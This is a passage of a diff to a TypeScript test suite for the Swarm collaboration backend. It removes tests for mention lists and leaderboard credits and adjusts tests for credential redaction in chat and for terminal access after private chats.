-  const waiting = async (tab: string, user: AuthUser, reader = store) => (await reader.read(user, tab)).state as SuperTabState & { mentionsWaiting?: number }
-
-  it('lists a tag only for the tagged person, with the message, and counts it on their state alone', async () => {
-    const { tab, lead, group, text, messageId } = await tagged()
-    const [mention, ...rest] = await list(tab, peer, 'waiting')
-    expect(rest).toEqual([])
-    expect(mention).toEqual({ id: expect.any(String), projectId: 'lead', projectName: 'Pilot', conversationId: group, conversationTitle: 'Copy review',
-      // The picked tag the text did not say opens it, as the server stores it (mentions.ts withTags).
-      messageId, leadId: lead, leadName: expect.any(String), text: `@peer ${text}`.slice(0, 200), createdAt: expect.any(String), resolvedAt: null, resolvedBy: null,
-      threadId: null, messageSequence: expect.any(Number) })
-    // Where the tagged message is in its chat, as its page numbers it: Desktop clears the red number once read past it.
-    const page = await app.inject({ method: 'GET', url: `/api/super-tabs/${tab}/conversations/${group}/messages`, headers: { authorization: `Bearer ${peer.sub}` } })
-    const shown = (page.json().data.messages as Array<{ id: string; sequence: number }>).find(m => m.id === messageId)
-    expect(mention!.messageSequence).toBe(shown!.sequence)
-    expect(mention!.leadName).toBe((await waiting(tab, owner)).agents.find(a => a.id === lead)!.displayName)
-    expect(await list(tab, owner, 'waiting')).toEqual([])
-    expect(await list(tab, peer, 'earlier')).toEqual([])
-    expect((await waiting(tab, peer)).mentionsWaiting).toBe(1)
-    expect((await waiting(tab, owner)).mentionsWaiting).toBe(0)
-    expect((await store.read(host, tab, lead)).state).not.toHaveProperty('mentionsWaiting')
-    expect((await store.messages(owner, tab, group, {})).messages.find(m => m.id === messageId)!.mentions).toEqual([peer.sub])
-  })
-
-  // Desktop's list (?mentions=1) carries each Swarm's waiting tags, so it makes no mentions call per Swarm.
-  const listed = async (user: AuthUser, tab: string, query = '?mentions=1') => {
-    let after: string | undefined
-    do {
-      const response = await app.inject({ method: 'GET', url: `/api/super-tabs/list${query}${after ? `${query ? '&' : '?'}after=${after}` : ''}`,
-        headers: { authorization: `Bearer ${user.sub}` } })
-      expect(response.statusCode, response.body).toBe(200)
-      const page = response.json().data as { tabs: Array<Record<string, unknown>>; next: string | null }
-      const row = page.tabs.find(t => t.id === tab)
-      if (row) return row
-      after = page.next ?? undefined
-    } while (after)
-    throw new Error('Swarm not listed')
-  }
-
-  it('counts each listed Swarm’s waiting tags in the list when asked, as its own state does', async () => {
-    const { tab } = await tagged()
-    const own = (await app.inject({ method: 'GET', url: `/api/super-tabs/${tab}/parts`, headers: { authorization: `Bearer ${peer.sub}` } }))
-      .json().data.derived as { mentionsWaiting: number; mentionsDigest: string }
-    expect(own).toMatchObject({ mentionsWaiting: 1, mentionsDigest: expect.any(String) })
-    expect(await listed(peer, tab)).toMatchObject({ id: tab, mentionsWaiting: 1, mentionsDigest: own.mentionsDigest })
-    expect(await listed(owner, tab)).toMatchObject({ id: tab, mentionsWaiting: 0 })
-    expect(await listed(peer, tab, '')).not.toHaveProperty('mentionsWaiting')
-    // A Swarm with no tags has the digest the Swarm's own state gives it.
-    const ownerDerived = (await app.inject({ method: 'GET', url: `/api/super-tabs/${tab}/parts`, headers: { authorization: `Bearer ${owner.sub}` } }))
-      .json().data.derived as { mentionsDigest: string }
-    expect(await listed(owner, tab)).toMatchObject({ mentionsDigest: ownerDerived.mentionsDigest })
-  })
-
-  it('finds the Swarms holding a tag by the tag index, never a scan of every tag', async () => {
-    const { tab } = await tagged()
-    const plan = JSON.stringify(await db.$runCommandRaw({ explain: { aggregate: 'SuperTabMention', pipeline: swarmsWithTags([tab], peer.sub, Date.now()),
-      cursor: {} }, verbosity: 'queryPlanner' }))
-    expect(plan).toContain('IXSCAN')
-    expect(plan).not.toContain('COLLSCAN')
-  })
-
-  it('leaves a tag out of the list’s count once the person can no longer read its conversation', async () => {
-    const { tab } = await tagged()
-    expect(await listed(peer, tab)).toMatchObject({ mentionsWaiting: 1 })
-    await run(tab, { type: 'project.sharing', projectId: 'lead', visibility: 'private', memberIds: [] })
-    expect(await listed(peer, tab)).toMatchObject({ mentionsWaiting: 0 })
-    expect((await waiting(tab, peer)).mentionsWaiting).toBe(0)
-  })
-
-  it('lists a person’s tag of another person under the author’s username, never their email', async () => {
-    const { tab, group } = await tagged()
-    await run(tab, { type: 'member.username', username: 'boss' })
-    const messageId = (await run(tab, { type: 'message.send', conversationId: group, text: 'Peer, see above.', replyTo: null, recipientIds: [],
-      mentions: [peer.sub] })).result.messageId as string
-    const mention = (await list(tab, peer, 'waiting')).find(m => m.messageId === messageId)
-    expect(mention).toEqual(expect.objectContaining({ leadId: owner.sub, leadName: 'boss', text: '@peer Peer, see above.' }))
-    expect(JSON.stringify(mention)).not.toContain(owner.email)
-  })
-
-  it('resolves on the person’s later post in that conversation, not on anyone else’s', async () => {
-    const { tab, group } = await tagged()
-    await run(tab, { type: 'message.send', conversationId: group, text: 'Owner chimes in.', replyTo: null, recipientIds: [] })
-    await run(tab, { type: 'message.send', conversationId: 'lead', text: 'Elsewhere.', replyTo: null, recipientIds: [] }, peer)
-    expect(await list(tab, peer, 'waiting')).toHaveLength(1)
-    await run(tab, { type: 'message.send', conversationId: group, text: 'Looks good.', replyTo: null, recipientIds: [] }, peer)
-    expect(await list(tab, peer, 'waiting')).toEqual([])
-    expect(await list(tab, peer, 'earlier')).toEqual([expect.objectContaining({ resolvedBy: 'reply', resolvedAt: expect.any(String) })])
-    expect((await waiting(tab, peer)).mentionsWaiting).toBe(0)
-  })
-
-  it('names the thread of a tag in a thread reply, never of one also sent to the chat or under a root the person cannot read', async () => {
-    const { tab, lead, group, messageId } = await tagged()
-    const send = async (text: string, extra: Record<string, unknown> = {}) => (await run(tab, { type: 'message.send', conversationId: group, text,
-      replyTo: messageId, recipientIds: [], mentions: [peer.sub], ...extra } as Command)).result.messageId as string
-    const inThread = await send('In the thread.'), alsoSent = await send('Also in the chat.', { alsoSend: true })
-    const threadOf = async () => Object.fromEntries((await list(tab, peer, 'waiting')).map(m => [m.messageId, m.threadId]))
-    expect(await threadOf()).toEqual({ [messageId]: null, [inThread]: messageId, [alsoSent]: null })
-    // A root nobody reads (an agent-only notice): its id never leaves, and the tag counts as the chat's.
-    await db.superTabMessage.update({ where: { id: messageId }, data: { source: { kind: 'note', recipientsOnly: true }, recipientIds: [lead] } })
-    expect((await threadOf())[inThread]).toBeNull()
-  })
-
-  it('resolves on the person’s reply inside a thread', async () => {
+  // Swarm v4 keeps no tag list (anh Dee, 2026-11-10): a tag stays on its message, as its readers see it, and nothing else is written
+  // or counted.
+  it('keeps a tag on its message alone: no tag row, no count on the person\'s read or the Swarm list', async () => {
     const { tab, group, messageId } = await tagged()
-    await run(tab, { type: 'message.send', conversationId: group, text: 'Confirmed.', replyTo: messageId, recipientIds: [] }, peer)
-    expect(await list(tab, peer, 'waiting')).toEqual([])
-    expect(await list(tab, peer, 'earlier')).toEqual([expect.objectContaining({ messageId, resolvedBy: 'reply' })])
-  })
-
-  it('counts a tag in a conversation gone quiet, as the list shows it, on every read, and never once the person cannot read it', async () => {
-    const { tab, lead, group } = await tagged()
-    const other = (await run(tab, { type: 'conversation.create', title: 'Pricing page', brief: '', checks: [] })).result.conversationId as string
-    await run(tab, { type: 'conversation.agent', conversationId: other, agentId: lead, present: true, lead: true })
-    await run(tab, { type: 'message.send', conversationId: other, text: 'Check the prices.', replyTo: null, recipientIds: [], mentions: [peer.sub] }, host, lead)
-    // Ordinary loads no longer read it (sweeps.ts puts quiet conversations to sleep).
-    await db.swarmGroup.updateMany({ where: { tabId: tab, key: group }, data: { dormant: true } })
-    const derived = async (url: string) => {
-      const response = await app.inject({ method: 'GET', url: `/api/super-tabs/${tab}/${url}`, headers: { authorization: `Bearer ${peer.sub}` } })
-      expect(response.statusCode, response.body).toBe(200)
-      return response.json().data as { cursor: string; derived: { mentionsWaiting?: number } }
-    }
-    const first = await derived('parts')
-    expect((await list(tab, peer, 'waiting')).map(m => m.conversationId).sort()).toEqual([group, other].sort())
-    expect(first.derived.mentionsWaiting).toBe(2)
-    expect((await derived(`changes?cursor=${first.cursor}`)).derived.mentionsWaiting).toBe(2)
-    expect((await waiting(tab, peer)).mentionsWaiting).toBe(2)
-    await run(tab, { type: 'project.sharing', projectId: 'lead', visibility: 'private', memberIds: [] })
-    expect(await db.swarmGroup.findFirst({ where: { tabId: tab, key: group }, select: { dormant: true } })).toEqual({ dormant: true })
-    expect(await list(tab, peer, 'waiting')).toEqual([])
-    expect((await derived('parts')).derived.mentionsWaiting).toBe(0)
-    expect((await waiting(tab, peer)).mentionsWaiting).toBe(0)
-  })
-
-  it('lets a tagged viewer mark it done', async () => {
-    const { tab } = await tagged('viewer')
-    const [mention] = await list(tab, peer, 'waiting')
-    await run(tab, { type: 'mention.done', mentionId: mention!.id as string }, peer)
-    expect(await list(tab, peer, 'earlier')).toEqual([expect.objectContaining({ id: mention!.id, resolvedBy: 'done' })])
-    expect((await waiting(tab, peer)).mentionsWaiting).toBe(0)
-  })
-
-  it('resolves when the person marks it done, and nobody else can', async () => {
-    const { tab } = await tagged()
-    const [mention] = await list(tab, peer, 'waiting')
-    const done: Command = { type: 'mention.done', mentionId: mention!.id as string }
-    await expect(run(tab, done)).rejects.toThrow('This mention is unavailable.')
-    const operationId = randomUUID()
-    await run(tab, done, peer, undefined, operationId)
-    await run(tab, done, peer, undefined, operationId)
-    expect(await list(tab, peer, 'waiting')).toEqual([])
-    expect(await list(tab, peer, 'earlier')).toEqual([expect.objectContaining({ id: mention!.id, resolvedBy: 'done' })])
-  })
-
-  it('drops a tag 30 days after it was made and from a conversation the person can no longer read', async () => {
-    const { tab } = await tagged()
-    const later = new SuperTabStore(db, () => Date.now() + 30 * DAY + 1000)
-    expect((await waiting(tab, peer, later)).mentionsWaiting).toBe(0)
-    expect((await waiting(tab, peer)).mentionsWaiting).toBe(1)
-    await run(tab, { type: 'project.sharing', projectId: 'lead', visibility: 'private', memberIds: [] })
-    expect(await list(tab, peer, 'waiting')).toEqual([])
-    expect((await waiting(tab, peer)).mentionsWaiting).toBe(0)
-    await ensureMentionExpiry(db)
-    const indexes = await db.$runCommandRaw({ listIndexes: 'SuperTabMention' }) as { cursor: { firstBatch: Array<{ key: object; expireAfterSeconds?: number }> } }
-    expect(indexes.cursor.firstBatch).toContainEqual(expect.objectContaining({ key: { createdAt: 1 }, expireAfterSeconds: MENTION_EXPIRY_MS / 1000 }))
-  })
-
-  describe('a tag held for a task with no worker', () => {
-    const MINUTE = 60_000
-    /** The Lead's notice that a failed start left a task with no worker, tagging the requester only if that lasts. */
-    async function held() {
-      const { tab, lead } = await fixture()
-      await invite(tab)
-      const group = (await run(tab, { type: 'conversation.create', title: 'Welcome copy', brief: 'Write the welcome copy',
-        checks: [{ description: 'Copy reads well', independent: false }] })).result.conversationId as string
-      await run(tab, { type: 'conversation.agent', conversationId: group, agentId: lead, present: true, lead: true })
-      const messageId = (await run(tab, { type: 'message.send', conversationId: group, text: 'Builder could not start on the Studio.', replyTo: null,
-        recipientIds: [], mentions: [peer.sub], mentionsIfNoWorker: true } as Command, host, lead)).result.messageId as string
-      return { tab, lead, group, messageId }
-    }
-    /** A store whose clock is [minutes] on. */
-    const after = (minutes: number) => new SuperTabStore(db, () => Date.now() + minutes * MINUTE)
-    const waitingAt = async (tab: string, minutes: number) => (await after(minutes).mentions(peer, tab, 'waiting')).mentions
-    const countAt = async (tab: string, minutes: number) => (await waiting(tab, peer, after(minutes))).mentionsWaiting
-    const assignAt = async (tab: string, group: string, lead: string, minutes: number) => String((await after(minutes).execute(owner, tab,
-      { operationId: randomUUID(), command: { type: 'work.assign', conversationId: group, agentId: lead } })).result.assignmentId)
-
-    it('does not tag the requester at once, and tags them once the group has had no worker for 20 minutes', async () => {
-      const { tab, group, messageId } = await held()
-      expect(await waitingAt(tab, 0)).toEqual([])
-      expect(await countAt(tab, 0)).toBe(0)
-      expect(await countAt(tab, 19)).toBe(0)
-      expect(await waitingAt(tab, 21)).toEqual([expect.objectContaining({ conversationId: group, messageId, resolvedBy: null })])
-      expect(await countAt(tab, 21)).toBe(1)
-      expect((await store.messages(owner, tab, group, {})).messages.find(m => m.id === messageId)!.mentions).toEqual([peer.sub])
-    })
-
-    it('never tags them when the Lead acted on the group after the notice', async () => {
-      const { tab, lead, group } = await held()
-      await run(tab, { type: 'message.send', conversationId: group, text: 'Starting it on another machine.', replyTo: null, recipientIds: [] }, host, lead)
-      expect(await waitingAt(tab, 21)).toEqual([])
-      expect(await countAt(tab, 21)).toBe(0)
-    })
-
-    // Only the coordinator's post handles the task: another agent's progress post leaves the tag held (final review).
-    it('still tags them when only another agent of the project posted in the group', async () => {
-      const { tab, group } = await held()
-      const other = (await run(tab, { type: 'agent.add', conversationId: group, machineId: 'test-host', harnessId: randomUUID(),
-        name: 'Engineer', configuration: config, lead: false })).result.agentId as string
-      await run(tab, { type: 'message.send', conversationId: group, text: 'Looking at the copy.', replyTo: null, recipientIds: [] }, host, other)
-      expect(await countAt(tab, 21)).toBe(1)
-    })
-
-    it('never tags them when a worker was assigned within the 20 minutes', async () => {
-      const { tab, lead, group } = await held()
-      await assignAt(tab, group, lead, 5)
-      expect(await waitingAt(tab, 21)).toEqual([])
-      expect(await (await after(21).mentions(peer, tab, 'earlier')).mentions).toEqual([])
-    })
-
-    it('clears a shown tag the moment a worker is assigned, and does not bring it back when that work ends', async () => {
-      const { tab, lead, group, messageId } = await held()
-      expect(await countAt(tab, 21)).toBe(1)
-      const assignmentId = await assignAt(tab, group, lead, 22)
-      expect(await waitingAt(tab, 22)).toEqual([])
-      expect(await countAt(tab, 22)).toBe(0)
-      expect((await after(22).mentions(peer, tab, 'earlier')).mentions).toEqual([expect.objectContaining({ messageId, resolvedBy: 'worker' })])
-      await after(23).execute(owner, tab, { operationId: randomUUID(), command: { type: 'work.cancel', conversationId: group, assignmentId, reason: 'Not needed' } })
-      expect(await waitingAt(tab, 24)).toEqual([])
-    })
-
-    const earlierAt = async (tab: string, minutes: number) => (await after(minutes).mentions(peer, tab, 'earlier')).mentions
-    const as = (minutes: number, user: AuthUser, tab: string, command: Command, agent?: string) =>
-      after(minutes).execute(user, tab, { operationId: randomUUID(), command }, agent)
-    const post = (group: string): Command => ({ type: 'message.send', conversationId: group, text: 'On it.', replyTo: null, recipientIds: [] })
-
-    it('keeps a tag the Lead acted on out of Waiting and Earlier, also when a worker is assigned or the requester replies later', async () => {
-      const { tab, lead, group } = await held()
-      await as(5, host, tab, post(group), lead)
-      await assignAt(tab, group, lead, 22)
-      expect(await waitingAt(tab, 22)).toEqual([])
-      expect(await earlierAt(tab, 22)).toEqual([])
-      const again = await held()
-      await as(5, host, again.tab, post(again.group), again.lead)
-      await as(25, peer, again.tab, post(again.group))
-      expect(await waitingAt(again.tab, 25)).toEqual([])
-      expect(await earlierAt(again.tab, 25)).toEqual([])
-    })
-
-    it('moves a listed tag to Earlier when the requester replies after minute 20, and never lists one answered before', async () => {
-      const late = await held()
-      await as(25, peer, late.tab, post(late.group))
-      expect(await waitingAt(late.tab, 25)).toEqual([])
-      expect(await earlierAt(late.tab, 25)).toEqual([expect.objectContaining({ messageId: late.messageId, resolvedBy: 'reply' })])
-      const early = await held()
-      await as(10, peer, early.tab, post(early.group))
-      expect(await waitingAt(early.tab, 25)).toEqual([])
-      expect(await earlierAt(early.tab, 25)).toEqual([])
-    })
-
-    it('keeps a tag out of the lists when its group has no worker but was archived', async () => {
-      const { tab, group } = await held()
-      await run(tab, { type: 'conversation.archive', conversationId: group, archived: true } as Command)
-      expect(await waitingAt(tab, 21)).toEqual([])
-    })
+    expect((await store.messages(peer, tab, group, {})).messages.find(m => m.id === messageId)!.mentions).toEqual([peer.sub])
+    // The tag list's collection is dropped and has no model: a raw count still sees any row written to it.
+    expect(Number((await db.$runCommandRaw({ count: 'SuperTabMention', query: { tabId: tab } }) as { n: unknown }).n)).toBe(0)
+    expect((await store.read(peer, tab)).state).not.toHaveProperty('mentionsWaiting')
+    const read = await app.inject({ url: `/api/super-tabs/${tab}/parts`, headers: { authorization: `Bearer ${peer.sub}` } })
+    expect(read.json().data.derived).not.toHaveProperty('mentionsWaiting')
+    const listed = await app.inject({ url: '/api/super-tabs/list', headers: { authorization: `Bearer ${peer.sub}` } })
+    expect(listed.statusCode).toBe(200)
+    expect(listed.json().data.tabs.find((t: { id: string }) => t.id === tab)).not.toHaveProperty('mentionsWaiting')
   })
 
   it('keeps the stored tab and older messages as the previous backend reads and writes them', async () => {
-    const { tab, group } = await tagged()
+    const { tab, lead, group } = await tagged()
     const stored = await storedState(tab)
     expect(JSON.stringify(stored)).not.toMatch(/mention/i)
     // A message the previous backend wrote has no mentions field; its next post omits mentions too.
     await db.$runCommandRaw({ insert: 'SuperTabMessage', documents: [{ _id: 'old-backend-row', tabId: tab, conversationId: group, sequence: 1,
       author: { kind: 'person', id: owner.sub, name: owner.email, membershipGeneration: tab }, text: 'Written before mentions.',
       replyTo: null, recipientIds: [], createdAt: { $date: new Date().toISOString() } }] })
-    await run(tab, { type: 'message.send', conversationId: group, text: 'Old shape.', replyTo: null, recipientIds: [] })
+    // The Lead's next post: only agents post in a task's chat (agentsOnly.test.ts).
+    await run(tab, { type: 'message.send', conversationId: group, text: 'Old shape.', replyTo: null, recipientIds: [] }, host, lead)
     const rows = (await store.messages(owner, tab, group, {})).messages
     expect(rows.find(m => m.id === 'old-backend-row')!.mentions).toEqual([])
     expect(rows.at(-1)!.mentions).toEqual([])
-  })
-})
-
-describe('leaderboard credits written by the store (leaderboard/record.ts)', () => {
-  const unblocks = async (tab: string, group: string) => (await storedState(tab)).conversations.find(c => c.id === group)!.ledger?.unblocks ?? []
-
-  it('credits a reply to a Lead\'s tag once, as a tag reply', async () => {
-    const { tab, lead } = await fixture()
-    await invite(tab)
-    const group = (await run(tab, { type: 'conversation.create', title: 'Copy review', brief: '', checks: [] })).result.conversationId as string
-    await run(tab, { type: 'conversation.agent', conversationId: group, agentId: lead, present: true, lead: true })
-    const tag = (await run(tab, { type: 'message.send', conversationId: group, text: 'Confirm the copy?', replyTo: null, recipientIds: [], mentions: [peer.sub] },
-      host, lead)).result.messageId as string
-    await run(tab, { type: 'message.send', conversationId: group, text: 'Confirmed.', replyTo: null, recipientIds: [] }, peer)
-    await run(tab, { type: 'message.send', conversationId: group, text: 'One more thing.', replyTo: null, recipientIds: [] }, peer)
-    expect(await unblocks(tab, group)).toEqual([{ personId: peer.sub, at: expect.any(Number), waitedMs: expect.any(Number), kind: 'tag_reply', item: tag }])
-  })
-
-  it('credits "Duyệt" in reply to the Lead\'s ask as an approval, in the Lead conversation', async () => {
-    const { tab, lead } = await fixture()
-    const ask = (await run(tab, { type: 'message.send', conversationId: 'lead', text: 'Plan: three steps. GO?', replyTo: null, recipientIds: [] }, host, lead))
-      .result.messageId as string
-    await run(tab, { type: 'message.send', conversationId: 'lead', text: 'Duyệt nhé', replyTo: ask, recipientIds: [] })
-    expect(await unblocks(tab, 'lead')).toEqual([expect.objectContaining({ personId: owner.sub, kind: 'approval', item: ask })])
-  })
-
-  it('credits the person asked for their decision answer', async () => {
-    const { tab, lead } = await fixture()
-    await invite(tab)
-    const asked = await run(tab, { type: 'decision.ask', conversationId: 'lead', personId: peer.sub,
-      questions: [{ question: 'Ship how?', options: ['Behind a flag', 'To everyone'], recommended: 0, unblocks: 'The release' }] }, host, lead)
-    const decisionId = (asked.result.decisionIds as string[])[0]!
-    await run(tab, { type: 'decision.answer', decisionId, choice: 1 }, peer)
-    expect(await unblocks(tab, 'lead')).toEqual([expect.objectContaining({ personId: peer.sub, kind: 'decision', item: decisionId })])
-  })
-
-  it('credits a worker\'s question asked again after it moved on once, when its decision is answered', async () => {
-    const { tab } = await fixture()
-    await invite(tab)
-    const group = (await run(tab, { type: 'conversation.create', title: 'Release', brief: 'Ship it.', checks: [{ description: 'Shipped.', independent: false }] })).result.conversationId as string
-    const worker = (await run(tab, { type: 'agent.add', conversationId: group, machineId: 'test-host', harnessId: randomUUID(),
-      name: 'Builder', configuration: config, lead: false })).result.agentId as string
-    const assignmentId = (await run(tab, { type: 'work.assign', conversationId: group, agentId: worker })).result.assignmentId as string
-    const ask = { type: 'work.status', conversationId: group, assignmentId, status: 'needs_human', result: 'Ship how?',
-      ask: { personId: peer.sub, options: ['Behind a flag', 'To everyone'], recommended: 0, unblocks: 'The release' } } as Command
-    await run(tab, ask, host, worker)
-    await run(tab, { type: 'work.status', conversationId: group, assignmentId, status: 'working', result: null } as Command, host, worker)
-    await run(tab, ask, host, worker)
-    const [decision] = await db.superTabDecision.findMany({ where: { tabId: tab } })
-    await run(tab, { type: 'decision.answer', decisionId: decision!.id, choice: 0 }, peer)
-    // The requester's next post answers nothing more: the repeated question was that decision again.
-    await run(tab, { type: 'message.send', conversationId: group, text: 'Behind a flag, then.', replyTo: null, recipientIds: [] })
-    expect(await unblocks(tab, group)).toEqual([expect.objectContaining({ personId: peer.sub, kind: 'decision', item: decision!.id })])
   })
 })
 
@@ -4033,7 +3474,6 @@ describe('credentials in Swarm chat', () => {
   const stored = async (tab: string) => JSON.stringify(await Promise.all([
     db.superTab.findMany({ where: { id: tab } }), storedState(tab), db.superTabMessage.findMany({ where: { tabId: tab } }),
     db.superTabOperation.findMany({ where: { tabId: tab } }), db.superTabDelivery.findMany({ where: { tabId: tab } }),
-    db.superTabAttempt.findMany({ where: { tabId: tab } }), db.superTabRouteDecision.findMany({ where: { tabId: tab } }),
   ]))
   /** Every line the process writes while `body` runs: console and the raw streams the logger could reach. */
   async function written(body: () => Promise<void>): Promise<string> {
@@ -4048,9 +3488,9 @@ describe('credentials in Swarm chat', () => {
 
   it('stores and delivers a person\'s message without the credentials, tells the sender, logs neither, and replays the same receipt', async () => {
     const { tab, lead } = await fixture()
-    const operationId = randomUUID()
+    const operationId = randomUUID(), chat = await pmChat(tab)
     const post = (text: string) => app.inject({ method: 'POST', url: `/api/super-tabs/${tab}/commands`,
-      headers: { authorization: `Bearer ${owner.sub}` }, payload: { operationId, command: message(text) } })
+      headers: { authorization: `Bearer ${owner.sub}` }, payload: { operationId, command: { ...message(text), conversationId: chat } } })
     let answer: { revision: number; result: Record<string, unknown> } | undefined
     const output = await written(async () => {
       const first = await post(pasted)
@@ -4059,16 +3499,16 @@ describe('credentials in Swarm chat', () => {
       expect(answer!.result).toEqual({ messageId: expect.any(String), credentialNotice: notice,
         credentialsRemoved: [{ kind: 'jwt', label: 'JWT', count: 1 }, { kind: 'github', label: 'GitHub token', count: 1 }] })
       // A retry of the same operation answers its receipt, notice included, and writes nothing more.
-      const before = (await store.messages(owner, tab, 'lead', {})).messages.length
+      const before = (await store.messages(owner, tab, chat, {})).messages.length
       const again = await post(pasted)
       expect(again.statusCode, again.body).toBe(200)
       expect(again.json().data).toEqual(answer)
-      expect((await store.messages(owner, tab, 'lead', {})).messages).toHaveLength(before)
+      expect((await store.messages(owner, tab, chat, {})).messages).toHaveLength(before)
       // The receipt is still bound to what was sent: other words under the same operation are refused, as before.
       const reused = await post('Something else entirely.')
       expect([reused.statusCode, reused.json().error.code]).toEqual([409, 'OPERATION_REUSED'])
     })
-    const row = (await store.messages(owner, tab, 'lead', { messageId: answer!.result.messageId as string })).messages[0]!
+    const row = (await store.messages(owner, tab, chat, { messageId: answer!.result.messageId as string })).messages[0]!
     expect(row.text).toBe(kept)
     const deliveries = await db.superTabDelivery.findMany({ where: { tabId: tab, messageId: row.id } })
     expect(deliveries.map(d => d.agentId)).toEqual([lead])
@@ -4079,28 +3519,13 @@ describe('credentials in Swarm chat', () => {
     }
   })
 
-  it('treats an agent\'s post the same, and a native terminal transcript too', async () => {
+  it('treats an agent\'s post the same', async () => {
     const { tab, lead } = await fixture()
     const posted = await run(tab, message(`gh auth status printed ${github}`), host, lead)
     expect(posted.result.credentialNotice).toBe('Removed a credential (GitHub token) before saving. Revoke or rotate it.')
     expect((await store.messages(owner, tab, 'lead', { messageId: posted.result.messageId as string })).messages[0]!.text)
       .toBe('gh auth status printed [credential removed]')
-    const group = (await run(tab, { type: 'conversation.create', title: 'Release', brief: 'Ship it',
-      checks: [{ description: 'Shipped', independent: false }] })).result.conversationId as string
-    const worker = (await run(tab, { type: 'agent.add', conversationId: group, machineId: 'test-host', harnessId: randomUUID(),
-      name: 'Release Engineer', configuration: config, lead: false })).result.agentId as string
-    const { contextId } = await store.native.open(owner, tab, { operationId: randomUUID(), conversationId: group, agentId: worker })
-    const prompt = { turnId: 'pasted_turn', kind: 'prompt' as const, previousEventId: null, text: `use this: ${jwt}`, truncated: false, interrupted: false }
-    const output = await written(async () => {
-      const recorded = await store.native.append(host, tab, contextId, prompt) as { eventId: string }
-      expect((await db.superTabMessage.findUniqueOrThrow({ where: { id: recorded.eventId } })).text).toBe('use this: [credential removed]')
-      expect(await store.native.append(host, tab, contextId, prompt)).toEqual(recorded)
-    })
-    const everything = await stored(tab)
-    for (const secret of [jwt, github]) {
-      expect(everything).not.toContain(secret)
-      expect(output).not.toContain(secret)
-    }
+    expect(await stored(tab)).not.toContain(github)
   })
 })
 
@@ -4195,14 +3620,7 @@ describe('Swarm parts storage', () => {
   })
 })
 
-describe('a closed Chat with PM through the store (Buddies replaced it, 10-29)', () => {
-  it('is never opened again, by a person or the PM', async () => {
-    const { tab, lead } = await fixture()
-    await invite(tab)
-    const open = { type: 'conversation.create' as const, title: 'Peer and PM', brief: '', checks: [], audience: { personIds: [peer.sub] } }
-    await expect(run(tab, open, peer)).rejects.toMatchObject({ code: 'PM_CHAT_CLOSED' })
-    await expect(run(tab, { ...open, brief: 'Talk', checks: [{ description: 'Talked', independent: false }] }, host, lead)).rejects.toMatchObject({ code: 'PM_CHAT_CLOSED' })
-  })
+describe('a closed Chat with PM through the store', () => {
 
   it('is out of everyone\'s reads and messages, its person\'s and the PM\'s included, takes no post, and stays stored', async () => {
     const { tab, lead } = await fixture()
@@ -4228,7 +3646,7 @@ describe('the PM\'s terminal after a private chat (final review, Critical 1)', (
   const bob: AuthUser = { sub: '100000000000000000000004', email: 'bob@example.com', autonomousEnv: 'prod', role: 'user' }
   /** Someone the machine's owner shared the PM's terminal with the ordinary way, outside any Swarm. */
   const carol: AuthUser = { sub: '100000000000000000000005', email: 'carol@example.com', autonomousEnv: 'prod', role: 'user' }
-  /** Alice (peer) and Bob read a public project whose machine neither owns; Alice told its PM something in the project chat,
+  /** Alice (peer) and Bob read a public project whose machine neither owns; a worker told its PM something in the project chat,
    *  and Bob held a share of the PM's terminal from before. */
   async function privateChat() {
     const { tab, lead } = await fixture()
@@ -4247,7 +3665,7 @@ describe('the PM\'s terminal after a private chat (final review, Critical 1)', (
       ownerId: host.sub, machineId: 'test-host', agentId, recipientEmail: recipient.email, autonomousEnv: 'prod', name: 'Lead', ownerPublicKey: 'fixture-key',
       expiresAt: new Date(Date.now() + 86_400_000), revokedAt: null } }).then(row => row.id)
     const swarmShare = await share(tab, bob), ordinaryShare = await share(null, carol)
-    const secret = await run(tab, { type: 'message.send', conversationId: 'lead', text: 'For the PM: the launch slips a week.', replyTo: null, recipientIds: [] }, peer)
+    const secret = await (await crew(tab, lead)).say('For the PM: the launch slips a week.')
     // The PM's host types it into the PM's terminal and confirms it.
     const delivery = (await store.deliveries(host, tab, lead)).find(d => d.messageId === secret.result.messageId)!
     const claimId = randomUUID()
@@ -4257,40 +3675,6 @@ describe('the PM\'s terminal after a private chat (final review, Critical 1)', (
     return { tab, lead, harnessId, swarmShare, ordinaryShare, share }
   }
   const observers = async (agentId: string) => (await rosterRows(store, host, 'test-host')).find(t => t.agent?.id === agentId)!.observers.map(p => p.userId)
-
-  // A terminal drives its session and its answers land in the conversation. Driving another person's Lead needs its machine's
-  // owner (terminal.ts mayDrive), so a member's terminal on a Builder made a Lead is refused from then on, whether or not it
-  // was revoked with the change.
-  it('refuses a member\'s terminal on a Builder made its project\'s Lead, at use and at open, and keeps the machine owner\'s', async () => {
-    const { tab } = await fixture()
-    await invite(tab)
-    const asHost = await run(tab, { type: 'invite.create', email: host.email, role: 'collaborator', conversationId: 'lead' })
-    await run(tab, { type: 'invite.accept', inviteId: asHost.result.inviteId as string }, host)
-    const second = (await run(tab, { type: 'project.create', name: 'Second', visibility: 'public', brief: '' })).result as { projectId: string; conversationId: string }
-    const group = String((await run(tab, { type: 'conversation.create', projectId: second.projectId, title: 'Build', brief: 'Build it', checks: [] })).result.conversationId)
-    const worker = String((await run(tab, { type: 'agent.add', conversationId: group, machineId: 'test-host', harnessId: randomUUID(),
-      name: 'Builder', configuration: config, lead: false })).result.agentId)
-    const opened = (user: AuthUser) => store.native.open(user, tab, { operationId: randomUUID(), conversationId: group, agentId: worker })
-    const { contextId: peers } = await opened(peer)
-    const { contextId: hosts } = await opened(host)
-    const typed = (contextId: string, turnId: string) => store.native.append(host, tab, contextId, { turnId, kind: 'prompt', previousEventId: null,
-      text: 'Typed into the Builder', truncated: false, interrupted: false })
-    await typed(peers, 'before')
-
-    await run(tab, { type: 'conversation.agent', conversationId: second.conversationId, agentId: worker, present: true, lead: true })
-    await expect(typed(peers, 'after')).rejects.toMatchObject({ code: 'NATIVE_CONTEXT_REVOKED' })
-    // The refusal at use says why, as the refusal at open does (review of #1940).
-    await db.superTabNativeContext.update({ where: { id: peers }, data: { revoked: false } })
-    await expect(typed(peers, 'why')).rejects.toMatchObject({ code: 'NATIVE_CONTEXT_REVOKED', message: expect.stringContaining('a Product Manager’s terminal') })
-    await expect(store.native.read(host, tab, peers)).rejects.toMatchObject({ code: 'NATIVE_CONTEXT_REVOKED' })
-    await expect(opened(peer)).rejects.toMatchObject({ code: 'TERMINAL_PRIVATE' })
-    // Even a terminal the change left unrevoked is refused at use.
-    await db.superTabNativeContext.update({ where: { id: peers }, data: { revoked: false } })
